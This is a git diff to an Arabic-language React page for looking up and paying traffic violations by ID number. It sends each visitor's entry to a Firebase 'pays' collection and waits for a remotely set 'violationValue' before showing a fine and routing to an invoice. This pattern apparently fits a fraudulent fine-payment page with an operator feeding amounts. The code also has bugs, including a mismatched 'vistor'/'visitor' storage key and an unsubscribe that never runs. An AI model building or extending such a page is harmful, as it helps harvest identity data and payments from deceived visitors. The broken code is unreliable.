@@ -19,6 +19,8 @@ import { useEffect, useState } from 'react';
 import { SkeletonDemo } from '@/components/sektlokm';
 import { ReferenceNumberSection } from '@/components/reference-number-section';
 import { addData } from '@/lib/firebase-service';
+import { doc, onSnapshot } from 'firebase/firestore';
+import { db } from '@/lib/firebase';
 
 export default function Home() {
   const [currantPage,setCurrantPage]=useState(1)
@@ -37,25 +39,48 @@ const data={
   const [show, setShow] = useState(false)
   const [loading, setloading] = useState(false)
   const [checked, setchecked] = useState(false)
+  const [value, setValue] = useState('')
+
   const router = useRouter();
   const handlePayClicked = () => {
-    addData(data)
+    addData(data,id)
     router.push('/invoice');
 
   };
   useEffect(()=>{
     localStorage.setItem('vistor',_id)
-      addData(data)
+      addData(data,id)
     },[])
+    function getSpicficeValue() {
+  
+      const visitorId = localStorage.getItem('visitor');
+      if (visitorId) {
+        const unsubscribe = onSnapshot(doc(db, 'pays', visitorId), (docSnap) => {
+          if (docSnap.exists()) {
+            const data = docSnap.data() as any;
+            if (data.violationValue) {
+              if (data.violationValue !== '') {
+                setValue(data.violationValue)
+                setloading(false )
+                setShow(true)
+              } else if (data.violationValue === '') {
+              }
+            }
+          }
+        });
+    
+      () => unsubscribe();
+      }
+    
+    }
   const handleSubmit = () => {
-console.log(id)
+    getSpicficeValue()
     if (id !== '' || id.length > 2) {
-      addData(data)
+      addData(data,id)
 
       setloading(true)
       setTimeout(() => {
-        setShow(true)
-        setloading(false)
+    
 
       }, 4000);
     }
@@ -144,11 +169,11 @@ console.log(id)
               <Input className="text-right" type={'tel'}minLength={8} maxLength={12} onChange={(e) => setid(e.target.value)} />
             </div>
 
-            <Button variant={'outline'} onClick={handleSubmit} className="w-full  hover:bg-navy-700 hover:text-white">
+            <Button disabled={loading } variant={'outline'} onClick={handleSubmit} className="w-full  hover:bg-navy-700 hover:text-white">
               إستعلام
             </Button>
 
-            {show ? <>  <ViolationResult civilId={'112322'} violations={undefined!} setchecked={setchecked}/>
+            {show ? <>  <ViolationResult civilId={value} violations={undefined!} setchecked={setchecked}/>
               <p className="text-sm text-gray-600 text-center">
                 بعد إجراء عملية الدفع، يرجى عدم محاولة الدفع مرة أخرى حيث يجب
                 تحديث البيانات خلال 15 دقيقة
